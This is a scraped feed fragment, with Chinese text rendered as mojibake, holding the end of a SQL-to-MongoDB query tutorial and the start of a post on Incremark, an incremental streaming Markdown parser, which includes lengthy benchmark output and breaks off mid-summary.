<span class="hljs-keyword">WHERE</span> order_no <span class="hljs-operator">=</span> "ORD20250002";
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// updateOneï¼šåªæ›´æ–°åŒ¹é…çš„ç¬¬ä¸€æ¡ï¼›updateManyï¼šæ›´æ–°æ‰€æœ‰åŒ¹é…é¡¹</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">updateOne</span>(
  { <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span> }, <span class="hljs-comment">// åŒ¹é…æ¡ä»¶</span>
  {
    <span class="hljs-attr">$set</span>: { <span class="hljs-comment">// åŸå­æ›´æ–°æ“ä½œç¬¦ï¼Œåªä¿®æ”¹æŒ‡å®šå­—æ®µ</span>
      <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
      <span class="hljs-attr">pay_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
    }
  }
);
</code></pre>
<h5 data-id="heading-10">å­åœºæ™¯4.2ï¼šåˆ é™¤æ“ä½œï¼ˆæ¸…ç†å–æ¶ˆçš„æ—§è®¢å•ï¼‰</h5>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- åˆ é™¤2024å¹´1æœˆ1æ—¥å‰åˆ›å»ºçš„å·²å–æ¶ˆè®¢å•</span>
<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "C" <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> "2024-01-01";
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">deleteMany</span>(
  {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"C"</span>,
    <span class="hljs-attr">create_time</span>: { <span class="hljs-attr">$lt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2024-01-01"</span>) } <span class="hljs-comment">// $ltå¯¹åº”SQLçš„&lt;</span>
  }
);
</code></pre>
<h4 data-id="heading-11">åœºæ™¯5ï¼šèšåˆç»Ÿè®¡ï¼ˆGROUP BY/HAVINGï¼‰</h4>
<p>MongoDBçš„èšåˆç®¡é“ï¼ˆAggregation Pipelineï¼‰æ˜¯æ ¸å¿ƒç‰¹æ€§ï¼Œé€šè¿‡å¤šä¸ªé˜¶æ®µç»„åˆå®ç°å¤æ‚ç»Ÿè®¡ï¼Œå¯¹åº”SQLçš„GROUP BYã€HAVINGç­‰åŠŸèƒ½ã€‚</p>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- ç»Ÿè®¡æ¯ä¸ªç”¨æˆ·çš„å·²å®Œæˆè®¢å•æ€»é‡‘é¢ï¼Œç­›é€‰æ€»é‡‘é¢&gt;500çš„ç”¨æˆ·</span>
<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">AS</span> total_amount, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> order_count
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id
<span class="hljs-keyword">HAVING</span> total_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">aggregate</span>([
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// 1. å…ˆè¿‡æ»¤æ•°æ®ï¼ˆå‡å°‘åç»­è®¡ç®—é‡ï¼‰</span>
  {
    <span class="hljs-attr">$group</span>: { <span class="hljs-comment">// 2. åˆ†ç»„ç»Ÿè®¡ï¼ˆå¯¹åº”GROUP BYï¼‰</span>
      <span class="hljs-attr">_id</span>: <span class="hljs-string">"$user_id"</span>, <span class="hljs-comment">// åˆ†ç»„å­—æ®µï¼ˆå¯¹åº”GROUP BYçš„user_idï¼‰</span>
      <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-string">"$amount"</span> }, <span class="hljs-comment">// æ±‚å’Œï¼ˆå¯¹åº”SUM(amount)ï¼‰</span>
      <span class="hljs-attr">order_count</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-number">1</span> } <span class="hljs-comment">// è®¡æ•°ï¼ˆå¯¹åº”COUNT(*)ï¼‰</span>
    }
  },
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$gt</span>: <span class="hljs-number">500</span> } } }, <span class="hljs-comment">// 3. ç­›é€‰åˆ†ç»„ç»“æœï¼ˆå¯¹åº”HAVINGï¼‰</span>
  { <span class="hljs-attr">$sort</span>: { <span class="hljs-attr">total_amount</span>: -<span class="hljs-number">1</span> } } <span class="hljs-comment">// 4. æ’åº</span>
]);
</code></pre>
<h3 data-id="heading-12">ä¸‰ã€æ ¸å¿ƒå·®å¼‚ä¸æœ€ä½³å®è·µæ€»ç»“</h3>
<h4 data-id="heading-13">1. SQLä¸MongoDBæ ¸å¿ƒå·®å¼‚</h4>






























<table><thead><tr><th>ç»´åº¦</th><th>SQLï¼ˆå…³ç³»å‹ï¼‰</th><th>MongoDBï¼ˆæ–‡æ¡£å‹ï¼‰</th></tr></thead><tbody><tr><td>æ•°æ®æ¨¡å‹</td><td>å›ºå®šè¡¨ç»“æ„ï¼Œéœ€é¢„å®šä¹‰schema</td><td>çµæ´»æ–‡æ¡£æ¨¡å‹ï¼Œæ”¯æŒåŠ¨æ€å­—æ®µ</td></tr><tr><td>å…³è”æ–¹å¼</td><td>é€šè¿‡JOINå®ç°å¤šè¡¨å…³è”</td><td>é€šè¿‡$lookupæˆ–åµŒå¥—æ–‡æ¡£å®ç°å…³è”</td></tr><tr><td>æŸ¥è¯¢é€»è¾‘</td><td>å£°æ˜å¼SQLè¯­å¥ï¼Œå•æ¡è¯­å¥å®Œæˆå¤æ‚æŸ¥è¯¢</td><td>èšåˆç®¡é“ï¼Œå¤šé˜¶æ®µç»„åˆå®ç°å¤æ‚é€»è¾‘</td></tr><tr><td>æ‰©å±•æ€§</td><td>å‚ç›´æ‰©å±•ä¸ºä¸»ï¼Œæ°´å¹³æ‰©å±•å¤æ‚</td><td>åŸç”Ÿæ”¯æŒåˆ†ç‰‡ï¼Œæ°´å¹³æ‰©å±•èƒ½åŠ›å¼º</td></tr></tbody></table>
<h4 data-id="heading-14">2. å®æˆ˜æœ€ä½³å®è·µ</h4>
<p><strong>åœ¨æˆ‘ä»¬çœŸå®çš„ç”µå•†é¡¹ç›®ä¸­ï¼Œå•†å“è¡¨å’Œè®¢å•è¡¨éƒ½æ˜¯ä½¿ç”¨çš„MongoDBå­˜å‚¨çš„ï¼Œä¸»è¦æ˜¯éœ€æ±‚å¤šï¼Œç»å¸¸è¦æ–°å¢å­—æ®µã€‚MySQLä¸æ˜“æ‹“å±•;</strong></p>
<p><strong>å•†å“æ•°æ®å­˜å‚¨</strong>ï¼šç”µå•†å•†å“å±æ€§å¤šæ ·ï¼ˆå¦‚å°ºç ã€é¢œè‰²ï¼Œä¿è´¨æœŸç­‰ç­‰å‚æ•°ï¼‰ï¼Œæ–‡æ¡£æ¨¡å‹å¯çµæ´»å­˜å‚¨ä¸åŒå“ç±»å•†å“çš„å·®å¼‚åŒ–å±æ€§ï¼Œæ”¯æŒå¿«é€ŸæŸ¥è¯¢å’Œä¿®æ”¹ã€‚</p>
<p><strong>è®¢å•æ•°æ®å­˜å‚¨</strong>ï¼šè®¢å•æ•°æ®å­—æ®µå¯èƒ½éšä¸šåŠ¡è¿­ä»£æ–°å¢ï¼ˆå¦‚ä¼˜æƒ åˆ¸æŠµæ‰£ã€å„ç§é…é€å¤‡æ³¨ï¼Œæ‹¦æˆªæ—¶é—´ç­‰ç­‰ï¼‰ï¼ŒMongoDB æ— éœ€ä¿®æ”¹è¡¨ç»“æ„å³å¯é€‚é…ï¼Œä¸”æŸ¥è¯¢é€Ÿåº¦å¿«ã€‚</p>
<ul>
<li>
<p><strong>ç´¢å¼•å¿…åŠ ä½†ä¸æ»¥åŠ </strong>ï¼šé’ˆå¯¹é«˜é¢‘æŸ¥è¯¢åˆ›å»ºç´¢å¼•ï¼Œé¿å…å¯¹å†™å…¥é¢‘ç¹çš„å­—æ®µåˆ›å»ºè¿‡å¤šç´¢å¼•ï¼ˆå½±å“å†™å…¥æ€§èƒ½ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ‰¹é‡æ“ä½œæå‡æ•ˆç‡</strong>ï¼šæ’å…¥/æ›´æ–°å¤šæ¡æ•°æ®æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨insertMany/updateManyï¼Œå‡å°‘ç½‘ç»œäº¤äº’ã€‚</p>
</li>
<li>
<p><strong>ç›‘æ§ä¸è°ƒä¼˜</strong>ï¼šé€šè¿‡explain()åˆ†ææŸ¥è¯¢æ‰§è¡Œè®¡åˆ’ï¼Œå®šä½å…¨è¡¨æ‰«æç­‰æ€§èƒ½é—®é¢˜ï¼ˆå¦‚db.orders.find({}).explain("executionStats")ï¼‰ã€‚</p>
</li>
</ul>
<hr/>
<p>ğŸ“£éå¸¸æ„Ÿè°¢ä½ é˜…è¯»åˆ°è¿™é‡Œï¼Œå¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œå¸Œæœ›èƒ½ç•™ä¸‹ä½ çš„ç‚¹èµğŸ‘ å…³æ³¨â¤ï¸ åˆ†äº«ğŸ‘¥ ç•™è¨€ğŸ’¬thanksï¼ï¼ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ—¶ä»£çœŸæ­£æµå¼è§£æ+æ¸²æŸ“åŒé‡ä¼˜åŒ–çš„ Incremark]]></title>    <link>https://juejin.cn/post/7583906846986469422</link>    <guid>https://juejin.cn/post/7583906846986469422</guid>    <pubDate>2025-12-15T02:57:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906846986469422" data-draft-id="7583613222344769562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ—¶ä»£çœŸæ­£æµå¼è§£æ+æ¸²æŸ“åŒé‡ä¼˜åŒ–çš„ Incremark"/> <meta itemprop="keywords" content="å‰ç«¯,Markdown,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-15T02:57:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kingç‹ä¸€å¸…"/> <meta itemprop="url" content="https://juejin.cn/user/395479917018408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ—¶ä»£çœŸæ­£æµå¼è§£æ+æ¸²æŸ“åŒé‡ä¼˜åŒ–çš„ Incremark
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479917018408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kingç‹ä¸€å¸…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T02:57:48.000Z" title="Mon Dec 15 2025 02:57:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ•…äº‹çš„å¼€å§‹</h2>
<p>æœ€åˆæ˜¯æƒ³è¦å®ç°å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ ai æµå¼è¾“å‡ºçš„ï¼Œæ­¤è¿‡ç¨‹å¤§è‡´ä¸º <code>ai -&gt; chunk -&gt; parser -&gt; propsemirror JSONContent</code> å®ç°å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­ç±»ä¼¼ ai èŠå¤©æ¡†ä¸€æ ·çš„æµå¼è¾“å‡ºï¼Œå¹¶ä¸”è¦å°½é‡èŠ‚çœæ€§èƒ½ã€‚</p>
<p>ç„¶åå°±å‡ºç°äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2F" target="_blank" title="https://incremark-docs.vercel.app/" ref="nofollow noopener noreferrer">incremark</a>ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¹Ÿå…³æ³¨åˆ°äº† <code>vue-stream-markdown</code>ï¼Œä¸è¿‡å®ƒåšçš„åªæ˜¯ vue æ¸²æŸ“å±‚çš„ä¼˜åŒ–ï¼Œæ¯æ¬¡ ai è¾“å‡ºçš„ markdown chunkï¼Œå®ƒè¿˜æ˜¯ä¼šå°†å…¶è·Ÿä¹‹å‰æ‰€æœ‰è¾“å‡ºæ‹¼æ¥è§£ææˆ tokenï¼Œè™½ç„¶åœ¨æ¸²æŸ“å±‚åšåˆ°äº†æµå¼çš„æ¸²æŸ“ï¼Œä½†å…¶å†…æ ¸æ— æ³•æ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚</p>
<h2 data-id="heading-1">æƒ³æ³•çš„å®ç°</h2>
<p>åœ¨é€‰æ‹© markdown åº•å±‚è§£æå™¨çš„æ—¶å€™å…³æ³¨äº† tiptap åœ¨ç”¨çš„ markedjs ä»¥åŠä¹‹å‰è‡ªå·±å®ç° tiptap markdown è½¬æ¢çš„ markdown-itï¼Œä½†æœ€ç»ˆè¿˜æ˜¯é€‰æ‹©äº† remark åº•å±‚ç¼–è¾‘å™¨ micromarkã€‚å› ä¸º markdown-it token ç»“æ„çš„å¤æ‚åº¦è¿œé«˜äº mdast ç»“æ„ï¼Œå®ƒå­˜åœ¨è¿›å…¥ã€é€€å‡ºçš„æ¦‚å¿µï¼Œä½† mdast å°±æ˜¯ä¸€æ£µæ ‘ã€‚</p>
<p>å› æ­¤æ‹¼æ¥ä¸€æ£µæ ‘çš„å¤æ‚åº¦å…¶å®æ˜¯æ›´ä½çš„ï¼Œæ•´ä¸ªå·¥å…·çš„è®¾è®¡æ€è·¯ä¸ºï¼š</p>
<ol>
<li>ç»´æŠ¤ä¸€ä¸ªæ–‡æœ¬ç¼“å†²åŒºï¼Œæ¥æ”¶æµå¼è¾“å…¥</li>
<li>è¯†åˆ«"ç¨³å®šè¾¹ç•Œ"ï¼ˆå¦‚ç©ºè¡Œã€æ ‡é¢˜ç­‰ï¼‰ï¼Œå°†å·²å®Œæˆçš„å—æ ‡è®°ä¸º completed</li>
<li>å¯¹äºæ­£åœ¨æ¥æ”¶çš„å—ï¼Œæ¯æ¬¡é‡æ–°è§£æï¼Œä½†åªè§£æè¯¥å—çš„å†…å®¹</li>
<li>å¤æ‚åµŒå¥—èŠ‚ç‚¹ï¼ˆå¦‚åˆ—è¡¨ã€å¼•ç”¨ï¼‰ä½œä¸ºæ•´ä½“å¤„ç†ï¼Œç›´åˆ°ç¡®è®¤å®Œæˆ</li>
</ol>
<p>æœ€ç»ˆå¯ä»¥å°†æµå¼ markdown çš„è§£æå¤æ‚åº¦ä» O(nÂ²) é™ä½åˆ° O(n)ï¼Œai è¾“å‡ºå†…å®¹è¶Šå¤šï¼Œæ€§èƒ½èŠ‚çœä¹Ÿè¶Šå¤šã€‚</p>
<h2 data-id="heading-2">å®é™… benchmark æµ‹è¯•</h2>
<p>å°å‹ markdown è§£ææ€§èƒ½å¯æé«˜ 2-10 å€ï¼Œä¸­å‹ markdown è§£ææ€§èƒ½æé«˜ 10-20 å€ï¼Œé•¿ markdown è§£ææ€§èƒ½æé«˜ 20-46 å€ï¼Œå½“å‰æ›´é•¿çš„æµ‹è¯•æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚</p>
<p>åŸå§‹æµ‹è¯•è¾“å‡ºç»“æœï¼š</p>
<pre><code class="hljs language-plain" lang="plain">============================================================
Incremark Benchmark
============================================================
Markdown length: 771 chars
Chunk size: 10 chars
Total chunks: 78
Iterations: 100
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 2608.41 ms
   Parse count: 7800
   Avg time per parse: 0.3344 ms
   Total chars parsed: 3,080,100

âš¡ Incremark (incremental)
   Total time: 638.36 ms
   Parse count: 7800
   Avg time per parse: 0.0818 ms
   Total chars parsed: 77,100

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 75.5%
   Chars parsing saved: 97.5%
   Speedup: 4.09x faster

============================================================

ğŸ”¬ Running Incremark Benchmark Suite


============================================================
ğŸ“„ Document Size: Short (~1KB) (1000 chars)
============================================================

ğŸ“¦ Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 10 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 435.85 ms
   Parse count: 2000
   Avg time per parse: 0.2179 ms
   Total chars parsed: 1,010,000

âš¡ Incremark (incremental)
   Total time: 171.50 ms
   Parse count: 2000
   Avg time per parse: 0.0858 ms
   Total chars parsed: 20,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 60.7%
   Chars parsing saved: 98.0%
   Speedup: 2.54x faster

============================================================

ğŸ“¦ Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 50 chars
Total chunks: 20
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 92.33 ms
   Parse count: 400
   Avg time per parse: 0.2308 ms
   Total chars parsed: 210,000

âš¡ Incremark (incremental)
   Total time: 43.77 ms
   Parse count: 400
   Avg time per parse: 0.1094 ms
   Total chars parsed: 20,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 52.6%
   Chars parsing saved: 90.5%
   Speedup: 2.11x faster

============================================================

============================================================
ğŸ“„ Document Size: Medium (~5KB) (5000 chars)
============================================================

ğŸ“¦ Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 10 chars
Total chunks: 500
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 10335.94 ms
   Parse count: 10000
   Avg time per parse: 1.0336 ms
   Total chars parsed: 25,050,000

âš¡ Incremark (incremental)
   Total time: 916.48 ms
   Parse count: 10000
   Avg time per parse: 0.0916 ms
   Total chars parsed: 100,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 91.1%
   Chars parsing saved: 99.6%
   Speedup: 11.28x faster

============================================================

ğŸ“¦ Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 50 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 2120.47 ms
   Parse count: 2000
   Avg time per parse: 1.0602 ms
   Total chars parsed: 5,050,000

âš¡ Incremark (incremental)
   Total time: 223.64 ms
   Parse count: 2000
   Avg time per parse: 0.1118 ms
   Total chars parsed: 100,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 89.5%
   Chars parsing saved: 98.0%
   Speedup: 9.48x faster

============================================================

============================================================
ğŸ“„ Document Size: Long (~10KB) (10000 chars)
============================================================

ğŸ“¦ Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 10 chars
Total chunks: 1000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 40596.85 ms
   Parse count: 20000
   Avg time per parse: 2.0298 ms
   Total chars parsed: 100,100,000

âš¡ Incremark (incremental)
   Total time: 1781.89 ms
   Parse count: 20000
   Avg time per parse: 0.0891 ms
   Total chars parsed: 200,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 95.6%
   Chars parsing saved: 99.8%
   Speedup: 22.78x faster

============================================================

ğŸ“¦ Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 50 chars
Total chunks: 200
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 8095.40 ms
   Parse count: 4000
   Avg time per parse: 2.0239 ms
   Total chars parsed: 20,100,000

âš¡ Incremark (incremental)
   Total time: 473.23 ms
   Parse count: 4000
   Avg time per parse: 0.1183 ms
   Total chars parsed: 200,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 94.2%
   Chars parsing saved: 99.0%
   Speedup: 17.11x faster

============================================================

============================================================
ğŸ“„ Document Size: Very Long (~20KB) (20000 chars)
============================================================

ğŸ“¦ Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 10 chars
Total chunks: 2000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 183844.78 ms
   Parse count: 40000
   Avg time per parse: 4.5961 ms
   Total chars parsed: 400,200,000

âš¡ Incremark (incremental)
   Total time: 3997.77 ms
   Parse count: 40000
   Avg time per parse: 0.0999 ms
   Total chars parsed: 400,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 97.8%
   Chars parsing saved: 99.9%
   Speedup: 45.99x faster

============================================================

ğŸ“¦ Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 50 chars
Total chunks: 400
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

ğŸ“Š Traditional (re-parse all)
   Total time: 37400.52 ms
   Parse count: 8000
   Avg time per parse: 4.6751 ms
   Total chars parsed: 80,200,000

âš¡ Incremark (incremental)
   Total time: 1001.10 ms
   Parse count: 8000
   Avg time per parse: 0.1251 ms
   Total chars parsed: 400,000

------------------------------------------------------------

ğŸ¯ Performance Improvement:
   Time saved: 97.3%
   Chars parsing saved: 99.5%
   Speedup: 37.36x faster

============================================================


================================================================================
ğŸ“ˆ Complete Benchmark Summary
================================================================================

| Document Size    | Chunk | Time Saved | Chars Saved | Speedup |
|------------------|-------|------------|-------------|---------|
| Short (~1KB)     | 10    |      60.7% |       98.0% |   2.54x |
| Short (~1KB)     | 50    |      52.6% |       90.5% |   2.11x |
| Medium (~5KB)    | 10    |      91.1% |       99.6% |  11.28x |
| Medium (~5KB)    | 50    |      89.5% |       98.0% |   9.48x |
| Long (~10KB)     | 10    |      95.6% |       99.8% |  22.78x |
| Long (~10KB)     | 50    |      94.2% |       99.0% |  17.11x |
| Very Long (~20KB) | 10    |      97.8% |       99.9% |  45.99x |
| Very Long (~20KB) | 50    |      97.3% |       99.5% |  37.36x |

--------------------------------------------------------------------------------

ğŸ“Š Average by Document Size:

   Short (~1KB): 2.33x faster, 56.7% time saved
   Medium (~5KB): 10.38x faster, 90.3% time saved
   Long (~10KB): 19.94x faster, 94.9% time saved
   Very Long (~20KB): 41.67x faster, 97.5% time saved

--------------------------------------------------------------------------------

ğŸ¯ Overall Average:
